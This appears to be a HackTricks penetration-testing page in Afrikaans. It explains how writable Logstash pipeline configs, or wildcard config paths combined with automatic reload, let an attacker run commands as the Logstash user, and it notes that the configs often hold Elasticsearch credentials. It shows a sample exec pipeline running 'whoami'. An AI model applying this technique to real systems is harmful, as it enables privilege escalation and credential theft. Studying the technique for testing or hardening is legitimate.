{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash word gebruik om **logs te versamel, te transformeer en te stuur** deur 'n stelsel bekend as **pipelines**. Hierdie pipelines bestaan uit **invoer**, **filter**, en **uitvoer** fases. 'n Interessante aspek ontstaan wanneer Logstash op 'n gecompromitteerde masjien werk.

### Pipeline Konfigurasie

Pipelines word geconfigureer in die lêer **/etc/logstash/pipelines.yml**, wat die plekke van die pipeline konfigurasies lys:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hierdie lêer onthul waar die **.conf** lêers, wat pyplyn-konfigurasies bevat, geleë is. Wanneer 'n **Elasticsearch output module** gebruik word, is dit algemeen dat **pyplyne** **Elasticsearch kredensiale** insluit, wat dikwels uitgebreide regte het weens Logstash se behoefte om data na Elasticsearch te skryf. Wildcards in konfigurasiepaaie laat Logstash toe om alle ooreenstemmende pyplyne in die aangewese gids uit te voer.

### Privilege Escalation via Writable Pipelines

Om 'n poging tot privilege-escalasie te doen, identifiseer eers die gebruiker waaronder die Logstash-diens loop, tipies die **logstash** gebruiker. Verseker dat jy aan **een** van hierdie kriteria voldoen:

- Besit **skryfrek** tot 'n pyplyn **.conf** lêer **of**
- Die **/etc/logstash/pipelines.yml** lêer gebruik 'n wildcard, en jy kan na die teikenlêergids skryf

Boonop moet **een** van hierdie voorwaardes vervul word:

- Vermoë om die Logstash-diens te herbegin **of**
- Die **/etc/logstash/logstash.yml** lêer het **config.reload.automatic: true** ingestel

Gegewe 'n wildcard in die konfigurasie, laat die skep van 'n lêer wat met hierdie wildcard ooreenstem toe dat opdragte uitgevoer word. Byvoorbeeld:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier, **interval** bepaal die uitvoeringsfrekwensie in sekondes. In die gegewe voorbeeld, loop die **whoami** opdrag elke 120 sekondes, met sy uitvoer gerig na **/tmp/output.log**.

Met **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, sal Logstash outomaties nuwe of gewysigde pyplyn konfigurasies opspoor en toepas sonder om 'n herlaai te benodig. As daar geen wildcard is nie, kan wysigings steeds aan bestaande konfigurasies gemaak word, maar versigtigheid word aanbeveel om ontwrigtings te vermy.

## References

{{#include ../../banners/hacktricks-training.md}}
